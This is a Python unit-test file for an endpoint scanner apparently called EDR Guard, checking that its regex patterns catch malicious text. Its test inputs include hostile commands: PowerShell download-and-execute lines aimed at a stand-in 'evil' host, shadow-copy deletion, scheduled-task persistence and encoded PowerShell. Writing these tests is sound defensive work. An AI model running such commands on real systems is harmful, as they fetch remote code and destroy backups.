"""Tests for EDR Guard's content pattern scanning.

Regression coverage for a bug where TEXT_PATTERNS (written as regexes, e.g.
`\\s+`, `(enc|e)`, escaped dots) were checked with a plain `in` substring test
instead of re.search(..., re.IGNORECASE). That silently made most malicious
patterns un-matchable against real content.

Run with: python -m unittest tests.test_guard -v
"""

import sys
import unittest
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))

import guard as g  # noqa: E402


class TextPatternDetectionTests(unittest.TestCase):
    def assert_blocked(self, data, label=""):
        with self.assertRaises(g.ThreatFound, msg=f"should have blocked: {label or data!r}"):
            g._scan_content("sample.txt", data, ".txt")

    def assert_clean(self, data, label=""):
        try:
            g._scan_content("sample.txt", data, ".txt")
        except g.ThreatFound as threat:
            self.fail(f"should NOT have blocked ({label or data!r}): {threat.reason}")

    def test_powershell_encoded_command(self):
        self.assert_blocked(b"powershell -enc JABzAD0A")
        self.assert_blocked(b"powershell.exe -e JABzAD0A")

    def test_wscript_shell_createobject(self):
        self.assert_blocked(b'Set objShell = CreateObject("WScript.Shell")')

    def test_cmd_exe_invocation(self):
        self.assert_blocked(b"cmd.exe /c whoami")

    def test_invoke_expression_shorthand(self):
        self.assert_blocked(b'IEX (New-Object Net.WebClient).DownloadString("http://evil")')

    def test_downloadfile(self):
        self.assert_blocked(b'(New-Object Net.WebClient).DownloadFile("http://evil/a.exe", "a.exe")')

    def test_vssadmin_shadow_delete(self):
        self.assert_blocked(b"vssadmin delete shadows /all /quiet")

    def test_schtasks_persistence(self):
        self.assert_blocked(b"schtasks /create /tn evil /tr evil.exe")

    def test_eicar_test_string(self):
        self.assert_blocked(
            b"X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"
        )

    def test_benign_text_is_clean(self):
        self.assert_clean(b"Just a normal README talking about kittens and sharing files.")

    def test_benign_code_mentioning_shell_word_is_clean(self):
        # Make sure we're not so trigger-happy we block anything with the
        # word "shell" in it when it isn't an actual WScript.Shell call.
        self.assert_clean(b"def run_shell_command(cmd): return cmd  # just a function name")

    def test_case_insensitive(self):
        self.assert_blocked(b"POWERSHELL -ENC JABzAD0A")
        self.assert_blocked(b'createobject ( "shell.application" )')


if __name__ == "__main__":
    unittest.main()
